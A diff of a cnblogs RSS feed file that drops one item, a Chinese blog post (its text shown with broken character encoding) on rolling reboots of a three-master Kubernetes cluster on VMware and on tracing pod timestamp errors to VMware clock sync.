@@ -3,7 +3,7 @@
     <channel>
         <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
         <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
-        <lastBuildDate>2026-06-20T13:50:58.803Z</lastBuildDate>
+        <lastBuildDate>2026-06-20T17:21:39.532Z</lastBuildDate>
         <description><![CDATA[
         ä¸»é¡µ - åå®¢å­ RSS
     ]]></description>
@@ -751,442 +751,6 @@ Redisè®¾ç½®è¿ææ¶é´ï¼ä¼è¯è¿æåè�
     </description>
     </item>
 <item>
-    <title><![CDATA[ K8s å¤ Master éå¯ï¼æµç¨æ¢³çä¸é®é¢ææ¥ ]]></title>
-    <link>https://www.cnblogs.com/manuscript/p/20671004</link>
-    <guid>a7d1edf0e551773a85c5d6547b144b7e</guid>
-    <description>
-    <![CDATA[ 
-            <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/manuscript/p/20671004" title="åå¸äº 2026-06-20 21:14">
-    <span role="heading" aria-level="2">K8s å¤ Master éå¯ï¼æµç¨æ¢³çä¸é®é¢ææ¥</span>
-    
-
-</a>
-
-            </h1>
-            <div class="clear"></div>
-            <div class="postBody">
-                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
-<h1 id="åè¨">åè¨</h1>
-<p>éç¾¤é¨ç½²å¨ VMware åå»ºçä¸å°èææºä¸ï¼æ¯å°èææºåæ¶æ¿æ Master è§è²ãå é¿ææªåç³»ç»å®å¨æ´æ°ï¼è¿ææ§è¡äº <code>dnf upgrade-minimal --security --allowerasing</code> åçº§åæ ¸ä¸è½¯ä»¶åãåæ ¸ç­æ´æ°ééå¯èç¹æè½çæï¼èä¸å°èç¹é½è¿è¡ç etcdï¼éå¯å¿é¡»éå°è¿è¡ï¼é¿åä¸¢å¤± quorum å¯¼è´éç¾¤ä¸å¯ç¨ã</p>
-<p>æ­¤å¤ï¼ç±äºéç¾¤è·å¨ VMware èææºä¹ä¸ï¼æ§è¡è¿å¥æµç¨æ¶è¿éå°äºä¸äºç¯å¢ç¸å³çé®é¢ï¼å·ä½è¡¨ç°ä¸è§£å³æ¹å¼æ´çå¨ææ«<a href="#%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5" rel="noopener nofollow">é®é¢ææ¥</a>ã</p>
-<pre><code class="language-bash"># kubectl get node -o wide
-NAME     STATUS   ROLES           AGE    VERSION    INTERNAL-IP   EXTERNAL-IP   OS-IMAGE             KERNEL-VERSION      CONTAINER-RUNTIME
-demo-1   Ready    control-plane   336d   v1.31.14   x.x.x.x       &lt;none&gt;        Ubuntu 24.04.4 LTS   6.8.0-53-generic    containerd://1.7.27
-demo-2   Ready    control-plane   336d   v1.31.14   x.x.x.x       &lt;none&gt;        Ubuntu 24.04.4 LTS   6.8.0-64-generic    containerd://1.7.27
-demo-3   Ready    control-plane   336d   v1.31.14   x.x.x.x       &lt;none&gt;        Ubuntu 24.04.4 LTS   6.8.0-106-generic   containerd://1.7.27
-</code></pre>
-<h1 id="èç¹éå¯æµç¨">èç¹éå¯æµç¨</h1>
-<p>æ¯å°èç¹æä»¥ä¸æ­¥éª¤å¾ªç¯æ§è¡ï¼<strong>æ£æ¥ etcd â é»æ­¢è°åº¦ â é©±é Pod â éå¯ â æ¢å¤è°åº¦</strong>ï¼å¨é¨å®æååå¤çä¸ä¸å°ã</p>
-<h2 id="1æ£æ¥-etcd-ç¶æ">1.æ£æ¥ etcd ç¶æ</h2>
-<blockquote>
-<p>etcd æ¨è<strong>å¥æ°èç¹</strong>é¨ç½²ï¼ä»¥ä¿è¯ quorumï¼å¤æ°æ´¾ï¼å­æ´»æ¶éç¾¤å¯æ­£å¸¸è¯»åãå®¹éè®¡ç®å¬å¼ï¼<strong><code>ân/2â + 1</code></strong>ï¼åèå®æ¹<a href="https://etcd.io/docs/v3.5/faq/#what-is-failure-tolerance" target="_blank" rel="noopener nofollow">å®¹éæ§è¯´æ</a>ãå½å 3 èç¹éè³å°ä¿è¯ 2 ä¸ª etcd å­æ´»ã</p>
-</blockquote>
-<p>ä»¥ä¸æä½éå¨<strong>æ¯å° etcd èç¹</strong>ä¸éªè¯ï¼</p>
-<pre><code class="language-bash">## éªè¯æ°æ®ä¸è´æ§ / èç¹å¥åº·
-# etcdctl --endpoints=https://127.0.0.1:2379 \
-        --cacert=/etc/kubernetes/pki/etcd/ca.crt \
-        --cert=/etc/kubernetes/pki/etcd/server.crt \
-        --key=/etc/kubernetes/pki/etcd/server.key \
-        endpoint status --write-out=table
-## DB SIZE:    æ°æ®åºå¤§å°ï¼é¨ç½²æ¶éè¿ --quota-backend-bytes è®¾ç½®ä¸éï¼é»è®¤ 2Gï¼
-## IS LEADER:  æ¯å¦ä¸º leader
-## IS LEARNER: æ¯å¦ä¸ºéæç¥¨æåï¼workerï¼
-## RAFT TERM:  leader ä»»æï¼é¡»ä¿è¯åèç¹è¯¥å¼ä¸è´ï¼éå¯ / ç½ç»æå¨é½ä¼ä½¿å¶ +1
-+------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+
-|        ENDPOINT        |        ID        | VERSION | DB SIZE | IS LEADER | IS LEARNER | RAFT TERM | RAFT INDEX | RAFT APPLIED INDEX | ERRORS |
-+------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+
-| https://x.x.x.x:2379   | 683c58b549788bd9 |  3.5.15 |   30 MB |      true |      false |        40 |  130863104 |          130863104 |        |
-+------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+
-
-## éªè¯è¿éæ§ / ååºå»¶è¿
-# etcdctl --endpoints=https://127.0.0.1:2379 \
-        --cacert=/etc/kubernetes/pki/etcd/ca.crt \
-        --cert=/etc/kubernetes/pki/etcd/server.crt \
-        --key=/etc/kubernetes/pki/etcd/server.key \
-        endpoint health --write-out=table
-## HEALTH: è½å¦è¯»å
-## TOOK:   è¯»ä¸ä¸ªéæº keyï¼æ éè¯¯å³å¤å®å¥åº·ï¼èæ¶ â ç½ç»å¾è¿ + leader å¿è·³ç¡®è®¤
-+------------------------+--------+-------------+-------+
-|        ENDPOINT        | HEALTH |    TOOK     | ERROR |
-+------------------------+--------+-------------+-------+
-| https://x.x.x.x:2379   |   true | 60.842745ms |       |
-+------------------------+--------+-------------+-------+
-
-## æ¥çæååè¡¨
-# etcdctl --endpoints=https://127.0.0.1:2379 \
-        --cacert=/etc/kubernetes/pki/etcd/ca.crt \
-        --cert=/etc/kubernetes/pki/etcd/server.crt \
-        --key=/etc/kubernetes/pki/etcd/server.key \
-        member list -w table
-## STATUS:       èç¹ç¶æ
-## PEER ADDRS:   èç¹é´éä¿¡å°å
-## CLIENT ADDRS: å®¢æ·ç«¯ï¼API serverï¼è®¿é®å°å
-## IS LEARNER:   æ¯å¦ä¸ºéæç¥¨æåï¼workerï¼
-+---------+---------+--------+----------------------+----------------------+------------+
-|   ID    | STATUS  |  NAME  |      PEER ADDRS      |     CLIENT ADDRS     | IS LEARNER |
-+---------+---------+--------+----------------------+----------------------+------------+
-| xxxxxxx | started | demo-1 | https://x.x.x.x:2380 | https://x.x.x.x:2379 |      false |
-| xxxxxxx | started | demo-2 | https://x.x.x.x:2380 | https://x.x.x.x:2379 |      false |
-| xxxxxxx | started | demo-3 | https://x.x.x.x:2380 | https://x.x.x.x:2379 |      false |
-+---------+---------+--------+----------------------+----------------------+------------+
-</code></pre>
-<h2 id="2é»æ­¢-pod-è°åº¦">2.é»æ­¢ Pod è°åº¦</h2>
-<p>éè¿ <code>cordon</code> æ è®°å¾éå¯èç¹ï¼é»æ­¢æ° Pod è°åº¦ä¸æ¥ï¼</p>
-<blockquote>
-<p>æ³¨ï¼<strong>ä¸æ¬¡åªæä½ä¸å°èç¹</strong>ï¼å®æè¯¥èç¹ç cordon â éå¯ â uncordon æµç¨åï¼æè½å¤çä¸ä¸å°ï¼ï¼ï¼</p>
-</blockquote>
-<pre><code class="language-bash"># kubectl cordon demo-1
-</code></pre>
-<h2 id="3é©±é-pod">3.é©±é Pod</h2>
-<blockquote>
-<p><code>kube-apiserver</code> / <code>controller-manager</code> / <code>scheduler</code> / <code>etcd</code> æ¯ kubelet ç´æ¥ç®¡ççéæ Podï¼static podï¼ï¼<strong>drain ä¸ä¼é©±éå®ä»¬</strong>ãåªè¦å¶ä½ä¸¤ä¸ªèç¹ç etcd å­æ´»ï¼éç¾¤æ§å¶é¢å°±æ­£å¸¸ã</p>
-</blockquote>
-<pre><code class="language-bash"># kubectl drain demo-1 \
-  --ignore-daemonsets \
-  --delete-emptydir-data \
-  --timeout=300s
-</code></pre>
-<p>é©±éåç¡®è®¤èç¹å·²åæ­¢è°åº¦ï¼</p>
-<pre><code class="language-bash"># kubectl get node
-NAME     STATUS                     ROLES           AGE    VERSION
-demo-1   Ready,SchedulingDisabled   control-plane   336d   v1.31.14
-demo-2   Ready                      control-plane   336d   v1.31.14
-demo-3   Ready                      control-plane   336d   v1.31.14
-</code></pre>
-<p><strong>å¸¸è§æ¥é</strong>ï¼é©±éè¶æ¶éå¸¸æ¯å ä¸º <a href="https://kubernetes.io/docs/concepts/workloads/pods/disruptions/" target="_blank" rel="noopener nofollow">PDB</a>ï¼PodDisruptionBudgetï¼ä¸åè®¸é©±éï¼ä¾å¦ï¼</p>
-<pre><code class="language-bash">error when evicting pods/"prometheus-k8s-0" -n "monitoring": Cannot evict pod as it would violate the pod's disruption budget.
-</code></pre>
-<p>ææ¥å¹¶å¤çè¯¥èç¹ç PDBï¼</p>
-<blockquote>
-<p>é¤ä¸´æ¶æ¹ PDB å¤ï¼ä¹å¯æ©å®¹å¯¹åºå¯æ¬æ°ï¼ææå¨æ¸ç Podï¼ä½è¿ä¼ä½¿ PDB å¤±å»æä¹ï¼ã</p>
-</blockquote>
-<pre><code class="language-bash"># kubectl get pdb -n monitoring prometheus-k8s
-NAME             MIN AVAILABLE   MAX UNAVAILABLE   ALLOWED DISRUPTIONS   AGE
-prometheus-k8s   1               N/A               0                     337d
-
-## ä¸´æ¶å° minAvailable è°ä¸º 0ï¼ç»æåå»ºè®®è¿åï¼
-# kubectl patch pdb prometheus-k8s -n monitoring --type=json -p='[{"op":"replace","path":"/spec/minAvailable","value":0}]'
-</code></pre>
-<h2 id="4éå¯èç¹">4.éå¯èç¹</h2>
-<pre><code class="language-bash"># ssh demo-1
-# reboot
-</code></pre>
-<h2 id="5æ¢å¤è°åº¦å¹¶éªè¯">5.æ¢å¤è°åº¦å¹¶éªè¯</h2>
-<p>èç¹éå¯åï¼ç¡®è®¤ç¶ææ¢å¤ <code>Ready</code>ï¼åæ ¸çæ¬ä¹ä¼åä¸ºæ´æ°åççæ¬ï¼ï¼åç¨ <code>uncordon</code> è§£é¤è°åº¦éå¶ï¼</p>
-<pre><code class="language-bash"># kubectl get node -o wide
-NAME     STATUS                      ROLES           AGE    VERSION    INTERNAL-IP   EXTERNAL-IP   OS-IMAGE             KERNEL-VERSION      CONTAINER-RUNTIME
-demo-1   Ready,SchedulingDisabled    control-plane   336d   v1.31.14   x.x.x.x       &lt;none&gt;        Ubuntu 24.04.4 LTS   6.8.0-124-generic   containerd://1.7.27
-demo-2   Ready                       control-plane   336d   v1.31.14   x.x.x.x       &lt;none&gt;        Ubuntu 24.04.4 LTS   6.8.0-64-generic    containerd://1.7.27
-demo-3   Ready                       control-plane   336d   v1.31.14   x.x.x.x       &lt;none&gt;        Ubuntu 24.04.4 LTS   6.8.0-106-generic   containerd://1.7.27
-
-# kubectl uncordon demo-1
-node/demo-1 uncordoned
-
-# kubectl get node -o wide
-NAME     STATUS   ROLES           AGE    VERSION    INTERNAL-IP   EXTERNAL-IP   OS-IMAGE             KERNEL-VERSION      CONTAINER-RUNTIME
-demo-1   Ready    control-plane   336d   v1.31.14   x.x.x.x       &lt;none&gt;        Ubuntu 24.04.4 LTS   6.8.0-124-generic   containerd://1.7.27
-demo-2   Ready    control-plane   336d   v1.31.14   x.x.x.x       &lt;none&gt;        Ubuntu 24.04.4 LTS   6.8.0-64-generic    containerd://1.7.27
-demo-3   Ready    control-plane   336d   v1.31.14   x.x.x.x       &lt;none&gt;        Ubuntu 24.04.4 LTS   6.8.0-106-generic   containerd://1.7.27
-</code></pre>
-<h2 id="6å¾ªç¯æä½">6.å¾ªç¯æä½</h2>
-<p>å½åèç¹å¤çå®æ¯ï¼åå°ç¬¬ 1 æ­¥å¯¹ä¸ä¸å°èç¹éå¤æ´ä¸ªæµç¨...</p>
-<h1 id="é®é¢ææ¥">é®é¢ææ¥</h1>
-<h2 id="1éå¯å-pod-è¢«æ è®°ä¸º-invalid">1.éå¯å Pod è¢«æ è®°ä¸º <code>&lt;invalid&gt;</code></h2>
-<h3 id="11é®é¢ç°è±¡">1.1.é®é¢ç°è±¡</h3>
-<p>éå¯èç¹åï¼è¯¥èç¹ææ Pod ç RESTARTS åæ¾ç¤ºä¸º <code>&lt;invalid&gt;</code>ï¼éæ Pod READY åå±ç¤ºä¸º 0/1ãå¨ k8s <a href="https://github.com/kubernetes/kubernetes/blob/v1.31.14/staging/src/k8s.io/apimachinery/pkg/util/duration/duration.go#L27" target="_blank" rel="noopener nofollow">æºç </a>ä¸­ï¼<strong>pod åå»ºæ¶é´ä¸å½åæ¶é´åå·®è¶è¿ 2 ç§å³æ¾ç¤º invalid</strong>ã</p>
-<pre><code class="language-bash"># kubectl get pods -A -o wide | grep demo-3
-NAMESPACE     NAME                             READY   STATUS    RESTARTS            AGE     IP         NODE
-kube-system   coredns-dbbb9ff68-z8wjd          1/1     Running   0 (&lt;invalid&gt; ago)   131m    x.x.x.x    demo-3
-kube-system   etcd-demo-3                      0/1     Running   0 (&lt;invalid&gt; ago)   10m     x.x.x.x    demo-3
-kube-system   kube-apiserver-demo-3            0/1     Running   0 (&lt;invalid&gt; ago)   10m     x.x.x.x    demo-3
-kube-system   kube-controller-manager-demo-3   0/1     Running   0 (&lt;invalid&gt; ago)   10m     x.x.x.x    demo-3
-kube-system   kube-proxy-f2fj8                 1/1     Running   1 (&lt;invalid&gt; ago)   75d     x.x.x.x    demo-3
-kube-system   kube-scheduler-demo-3            0/1     Running   0 (&lt;invalid&gt; ago)   10m     x.x.x.x    demo-3
-kube-system   node-local-dns-xkfxc             1/1     Running   3 (&lt;invalid&gt; ago)   75d     x.x.x.x    demo-3
-</code></pre>
-<h3 id="12ææ¥è¿ç¨">1.2.ææ¥è¿ç¨</h3>
-<h4 id="121æ ¡éªå®¹å¨ä¸èç¹æ¶é´">1.2.1.æ ¡éªå®¹å¨ä¸èç¹æ¶é´</h4>
-<p>ä»¥ etcd Pod ä¸ºä¾ï¼å¶ <code>startedAt</code>ï¼UTCï¼æ¯èç¹å½å UTC æ¶é´æäºçº¦ 7 å°æ¶ 40 åï¼å¤äº "æªæ¥" æ¶é´ï¼</p>
-<blockquote>
-<p>éè¿æ¶é´ç»å°¾ç Z å¤æ­<a href="https://en.wikipedia.org/wiki/ISO_8601" target="_blank" rel="noopener nofollow">æ¶é´æ ¼å¼</a>ä¸º UTC</p>
-</blockquote>
-<pre><code class="language-bash">## èç¹å½åæ¶é´ï¼CST / UTCï¼
-# date
-Wed Jun 17 09:06:16 PM CST 2026
-# date -u
-Wed Jun 17 01:06:16 PM UTC 2026
-
-## Pod å®¹å¨ç¶æï¼æ¶é´ä¸º UTCï¼
-# kubectl get pod -n kube-system etcd-demo-1 -o jsonpath='{.status.containerStatuses}' | jq .
-[
-  {
-    ...
-    "lastState": {
-      "terminated": {
-        "exitCode": 255,
-        "finishedAt": "2026-06-17T20:46:05Z",
-        "reason": "Unknown",
-        "startedAt": "2026-06-17T09:56:07Z"
-      }
-    },
-    "name": "etcd",
-    "ready": false,
-    "restartCount": 4,
-    "state": {
-      "running": {
-        "startedAt": "2026-06-17T20:46:16Z"
-      }
-    }
-  }
-]
-
-## containerd è®°å½çå®¹å¨åå»º/å¯å¨æ¶é´
-## https://github.com/kubernetes-sigs/cri-tools/blob/v1.26.1/cmd/crictl/container.go#L862
-# crictl inspect 2ea3cdadfec6f | grep -Ei "createdAt|startedAt|finishedAt"
-    "createdAt": "2026-06-18T04:46:16.17870878+08:00",
-    "startedAt": "2026-06-18T04:46:16.641950022+08:00",
-    "finishedAt": "0001-01-01T00:00:00Z",
-
-## æ¢ç®ä¸º UTC ç»ä¸å¯¹æ¯
-##   containerd:  2026-06-17 20:46:16 UTC
-##   èç¹å½å:    2026-06-17 13:06:16 UTC   â å®¹å¨æ¶é´å¨ãæªæ¥ãï¼æ 7h40mï¼
-</code></pre>
-<h4 id="122æ ¡éª-pod-åºå±å®¹å¨ç¶æ">1.2.2.æ ¡éª Pod åºå±å®¹å¨ç¶æ</h4>
-<p>æé¤ containerd / etcd å¼å¸¸ãåºå±å®¹å¨å®éå¤äº Running ç¶æï¼</p>
-<pre><code class="language-bash"># crictl ps -a | grep 'etcd'
-CONTAINER        IMAGE            CREATED                  STATE      NAME    ATTEMPT  POD ID           POD
-2ea3cdadfec6f    2e96e5913fc06    Less than a second ago   Running    etcd    4        7451b51061d22    etcd-demo-1
-fab531bce16e7    2e96e5913fc06    3 hours ago              Exited     etcd    3        5f897d72fd206    etcd-demo-1
-
-## è¿ç¨ç¡®å®å¨è·
-# ps aux | grep -v 'grep' | grep 'etcd'
-root  2089  ...  etcd --advertise-client-urls=https://x.x.x.x:2379 ...
-
-## etcd èç¹ç¶æ
-# etcdctl --endpoints=https://127.0.0.1:2379 \
-          --cacert=/etc/kubernetes/pki/etcd/ca.crt \
-          --cert=/etc/kubernetes/pki/etcd/server.crt \
-          --key=/etc/kubernetes/pki/etcd/server.key \
-          endpoint status -w table
-+------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+
-|        ENDPOINT        |        ID        | VERSION | DB SIZE | IS LEADER | IS LEARNER | RAFT TERM | RAFT INDEX | RAFT APPLIED INDEX | ERRORS |
-+------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+
-| https://x.x.x.x:2379   | 683c58b549788bd9 |  3.5.15 |   30 MB |     false |      false |        59 |  131325454 |          131325454 |        |
-+------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+
-</code></pre>
-<h4 id="123å®ä½æ¶é´é®é¢æ ¹å ">1.2.3.å®ä½æ¶é´é®é¢æ ¹å </h4>
-<p>åèç¹é½éäº NTPï¼å¯¹æ¯æ¶é´ä¸è´ãè¿éæçæ³æ³æ¯è¿æ ·çï¼containerd æå¡æ¬èº«å·²ç»å¾å¤å¹´äºï¼å¤§æ¦çä¸ä¼æè¿ç§ bugï¼æ´å¯è½æ¯ä»åå»ºå®¹å¨æ¶ï¼è¯å«å°çæ¶é´å°±æ¯å¨ "æªæ¥"...é£ç°å¨æ¥çæ¶é´å´æ­£å¸¸äºï¼åºè¯¥æ¯è¢«èç¹ä¸­éç½®çæ¶é´åæ­¥æ¹åæ¥äºãæä»¥ææéè¿ dmesg çä¸ä¸å¯å¨åçåæ ¸è®°å½ï¼</p>
-<pre><code class="language-bash"># dmesg -T | grep -iEw "rtc|time|clock"
-[Wed Jun 17 20:54:08 2026] vmware: Host bus clock speed read from hypervisor : 66000000 Hz
-[Wed Jun 17 20:54:08 2026] vmware: using clock offset of 5629468472 ns
-[Wed Jun 17 20:54:08 2026] PM: RTC time: 12:54:08, date: 2026-06-17
-[Wed Jun 17 20:54:09 2026] PTP clock support registered
-## è®¾ç½® UTC æ¶é´
-[Wed Jun 17 20:54:10 2026] rtc_cmos 00:01: setting system clock to 2026-06-17T12:54:10 UTC (1781700850)
-[Wed Jun 17 20:54:11 2026] Loaded X.509 cert 'Build time autogenerated kernel key: ...'
-## åæ ¸è®¾ç½®å®æ¶é´çº¦ 40 ç§å systemd-journald åè®°å½äºä¸æ¬¡æ¶é´ååè·³å
-[Wed Jun 17 20:54:50 2026] systemd-journald[525]: Time jumped backwards, rotating.
-</code></pre>
-<p>ç¨ journalctl æ systemd-journald è®°å½çæ¥å¿å¯¼åºï¼ç±äºè¾åºè¾å¤ï¼æåäºä¸äºç²¾ç®ãåç°æ¶é´çº¿ä¸ºï¼<code>20:54:xx â 04:45:xx â 20:54:xx</code>ï¼å¨ä¸»æºæ¶é´è¢«æ¨å°"æªæ¥"ï¼04:45ï¼æ¶ containerd æå¯å¨ï¼æä»¥åå»ºåºçå®¹å¨æ¶é´ä¹æ¯ "æªæ¥"ã</p>
-<blockquote>
-<p>æ³¨ï¼è¿ä»½æ¥å¿å¹¶ä¸è½ç´æ¥è¯ææ¯ VMware æ¹çæ¶é´ãæçå¤æ­ä¾æ®æ¯ï¼æ¶é´è¢«æ¹ä¸º 04:45:xx åå¯å¨çåªæ ssh/cron ç­ç³»ç»æå¡ï¼ä»ä»¬ä¸æ²¡ææ¹æ¶é´çè½åï¼è VGAuthService æ¯è·æ¹æ¶æè¿ãä¸å·å¤æ¹æ¶è½åçæå¡ï¼å æ­¤åä¸ºç¬¬ä¸æçå¯¹è±¡ï¼åç»­æ²»æ¬æ¹æ¡ä¹éªè¯äºè¿ä¸ç¹ã</p>
-</blockquote>
-<pre><code class="language-bash">## åå®¹è¾å¤ï¼è¾åºå°æä»¶åæªåå¿è¦çæ®µ
-# journalctl -b --no-pager &gt; journalctl.txt
-## -b: åªçæ¬æ¬¡å¼æºåçæ¥å¿;
-## --no-pager: ä¸åé¡µå¨é¨è¾åº
-
-## 50 ç§ååå¯çå°ææ¾çæ¶é´å·®å¼ï¼20:54:xx â 04:45:xx â 20:54:xx
-Jun 17 20:54:19 demo-1 kernel: DMI: VMware, Inc. VMware Virtual Platform/...
-Jun 17 20:54:19 demo-1 kernel: vmware: hypercall mode: 0x02
-Jun 17 20:54:19 demo-1 kernel: Hypervisor detected: VMware
-Jun 17 20:54:19 demo-1 kernel: vmware: TSC freq read from hypervisor : 2600.000 MHz
-Jun 17 20:54:19 demo-1 kernel: vmware: Host bus clock speed read from hypervisor : 66000000 Hz
-Jun 17 20:54:19 demo-1 kernel: vmware: using clock offset of 5629468472 ns
-Jun 17 20:54:19 demo-1 kernel: Booting paravirtualized kernel on VMware hypervisor
-Jun 17 20:54:26 demo-1 VGAuthService[799]: Using '/var/lib/vmware/VGAuth/aliasStore' for alias store root directory
-Jun 17 20:54:26 demo-1 VGAuthService[799]: LoadCatalogAndSchema: Using '/etc/vmware-tools/vgauth/schemas' for SAML schemas
-Jun 17 20:54:26 demo-1 VGAuthService[799]: LoadPrefs: Allowing 300 of clock skew for SAML date validation
-Jun 17 20:54:26 demo-1 VGAuthService[799]: SAML_Init: Using xmlsec1 1.2.39 for XML signature support
-Jun 17 20:54:26 demo-1 VGAuthService[799]: ServiceNetworkCreateSocketDir: Created socket directory '/var/run/vmware'
-Jun 17 20:54:26 demo-1 VGAuthService[799]: BEGIN SERVICE
-Jun 17 20:54:26 demo-1 systemd[1]: Starting etcd.service - Etcd Service...
-## ä¸»æºæ¶é´è¢«æ¨å° "æªæ¥" å,containerd æå¯å¨
-Jun 18 04:45:57 demo-1 systemd-resolved[796]: Clock change detected. Flushing caches.
-Jun 18 04:45:57 demo-1 systemd[1]: Started kubelet.service - kubelet: The Kubernetes Node Agent.
-Jun 18 04:45:58 demo-1 systemd[1]: Starting containerd.service - containerd container runtime...
-Jun 18 04:46:16 demo-1 containerd[919]: time="..." msg="CreateContainer ... for &amp;ContainerMetadata{Name:etcd,Attempt:4,} returns container id \"2ea3cdadfec6f...\""
-Jun 18 04:46:16 demo-1 containerd[919]: time="..." msg="StartContainer for \"2ea3cdadfec6f...\""
-Jun 18 04:46:16 demo-1 systemd[1]: Started cri-containerd-2ea3cdadfec6f....scope - libcontainer container 2ea3cdadfec6f....
-Jun 18 04:46:16 demo-1 containerd[919]: time="..." msg="StartContainer for \"2ea3cdadfec6f...\" returns successfully"
-## æ¶éåæ¬¡è¢«æ´æ¹
-Jun 17 20:54:50 demo-1 systemd-resolved[796]: Clock change detected. Flushing caches.
-Jun 17 20:54:50 demo-1 systemd-journald[525]: Time jumped backwards, rotating.
-Jun 17 20:54:50 demo-1 systemd-timesyncd[797]: Contacted time server 91.189.91.157:123 (ntp.ubuntu.com).
-Jun 17 20:54:50 demo-1 systemd-timesyncd[797]: Initial clock synchronization to Wed 2026-06-17 20:54:50.365713 CST.
-Jun 17 20:54:50 demo-1 systemd[1]: etcd.service: Scheduled restart job, restart counter is at 2.
-Jun 17 20:54:50 demo-1 systemd[1]: Starting etcd.service - Etcd Service...
-</code></pre>
-<h3 id="13è§£å³æ¹å¼">1.3.è§£å³æ¹å¼</h3>
-<p>éè¿ä¸é¢æ¥å¿è¾åºï¼æçæ ¹å æ¯ VMware å¯¼è´çæ¶é´è·³åï¼é£å°±ææä¸¤æ¡è·¯ï¼</p>
-<ol>
-<li>æ¹èææºèªèº«å¯å¨é¡ºåºï¼æ²»æ ï¼ï¼</li>
-<li>æ¹ VMware æ¶é´åæ­¥éç½®ï¼æ²»æ¬ï¼ã</li>
-</ol>
-<h4 id="131æ²»æ æ´æ¹å¯å¨é¡ºåº">1.3.1.æ²»æ ï¼æ´æ¹å¯å¨é¡ºåº</h4>
-<p>éç¨äºæ²¡æ VMware å®¿ä¸»æºæéçåºæ¯ãæ°å»ºä¸ä¸ªç­å¾æ¶éåæ­¥çæå¡ï¼è®© kubelet ä¾èµå®ï¼ç¡®ä¿ä¸»æºæ¶é´æ¢å¤æ­£å¸¸ååæèµ·å®¹å¨ãä»¥å contaierd ä¹éè¦è¿ä¸ªä¾èµï¼å¦åä¼åºç°ä¸ä¸ä¸ªé®é¢ã</p>
-<blockquote>
-<p>è¿ä¸ªèªå®ä¹æå¡å·ä½åå®¹ä¸éè¦ï¼æ¢æ <code>sleep 60</code> ä¹è½è¾¾å°ç®çã</p>
-</blockquote>
-<pre><code class="language-bash">## 1. ç¨ Drop-In èéç´æ¥æ¹ kubelet.service
-##    /usr/lib/systemd/system/kubelet.service å½ rpm/deb åææï¼åçº§ä¼è¢«è¦ç;
-##    systemd Drop-In (/etc/systemd/system/kubelet.service.d/) ä¸å±äºä»»ä½å,ç±»ä¼¼ helm custom value.
-# systemctl status kubelet
-## â kubelet.service - kubelet: The Kubernetes Node Agent
-##      Loaded: loaded (/usr/lib/systemd/system/kubelet.service; enabled; preset: enabled)
-##     Drop-In: /usr/lib/systemd/system/kubelet.service.d/
-##              ââ10-kubeadm.conf
-# mkdir /etc/systemd/system/kubelet.service.d/
-
-## 2. æ°å»ºç­å¾æ¶éåæ­¥æå¡
-cat &gt; /etc/systemd/system/wait-for-clock-sync.service &lt;&lt;'EOF'
-[Unit]
-Description=Wait for system clock to be synchronized
-After=systemd-timesyncd.service network-online.target
-Before=kubelet.service
-Wants=network-online.target
-
-[Service]
-Type=oneshot
-RemainAfterExit=yes
-ExecStart=/bin/bash -c 'for i in $(seq 1 60); do if timedatectl show -p NTPSynchronized --value 2&gt;/dev/null | grep -q yes; then exit 0; fi; sleep 1; done; exit 0'
-TimeoutStartSec=70
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-## 3. è®© kubelet ä¾èµå®
-cat &gt; /etc/systemd/system/kubelet.service.d/20-wait-time-sync.conf &lt;&lt;'EOF'
-[Unit]
-After=wait-for-clock-sync.service
-Requires=wait-for-clock-sync.service
-EOF
-
-## 4. å¯ç¨ + éè½½
-# systemctl daemon-reload
-# systemctl enable --now wait-for-clock-sync.service
-
-## 5. éªè¯ä¾èµé¾
-# systemctl list-dependencies --reverse wait-for-clock-sync.service
-# systemctl status wait-for-clock-sync.service
-</code></pre>
-<h4 id="132æ²»æ¬å³é­-vmware-æ¶é´åæ­¥">1.3.2.æ²»æ¬ï¼å³é­ VMware æ¶é´åæ­¥</h4>
-<p>æ¬æ¬¡ç¯å¢æ¯ VMware ä¸èææºæ¶é´ä¸ä¸è´ãå¯å¨æ¶æèææºæ¶é´æ¨ä¹±å¯¼è´çãåè <a href="https://blogs.vmware.com/cloud-foundation/2016/01/06/completely-disable-time-synchronization-for-your-vm/" target="_blank" rel="noopener nofollow">VMware å®æ¹åå®¢</a>ï¼å³ææææ¶é´åæ­¥ï¼</p>
-<ol>
-<li>å³é­èææºï¼</li>
-<li>æ´æ¹å¯¹åºæºå¨ vmx éç½®ï¼</li>
-<li>å¼æºã</li>
-</ol>
-<pre><code class="language-bash">## å¨ ESXi å®¿ä¸»æºä¸ç¼è¾å¯¹åºèææºç vmx
-# grep -i 'time' /vmfs/volumes/data-1/demo-1/demo-1.vmx
-time.synchronize.continue = "FALSE"
-time.synchronize.restore = "FALSE"
-time.synchronize.resume.disk = "FALSE"
-time.synchronize.shrink = "FALSE"
-time.synchronize.tools.startup = "FALSE"
-time.synchronize.tools.enable = "FALSE"
-time.synchronize.resume.host = "FALSE"
-</code></pre>
-<pre><code class="language-bash">## å³é­åéå¯ï¼dmesg ä¸åææ¶é´è·³å
-# dmesg -T | grep -iEw "rtc|time|clock"
-[Thu Jun 18 18:14:06 2026] vmware: Host bus clock speed read from hypervisor : 66000000 Hz
-[Thu Jun 18 18:14:06 2026] vmware: using clock offset of 4177512396 ns
-[Thu Jun 18 18:14:07 2026] PM: RTC time: 10:14:06, date: 2026-06-18
-[Thu Jun 18 18:14:08 2026] PTP clock support registered
-[Thu Jun 18 18:14:08 2026] rtc_cmos 00:01: setting system clock to 2026-06-18T10:14:08 UTC (1781777648)
-[Thu Jun 18 18:14:08 2026] Loaded X.509 cert 'Build time autogenerated kernel key: ...'
-[Thu Jun 18 18:14:09 2026] Loaded X.509 cert 'Build time autogenerated kernel key: ...'
-</code></pre>
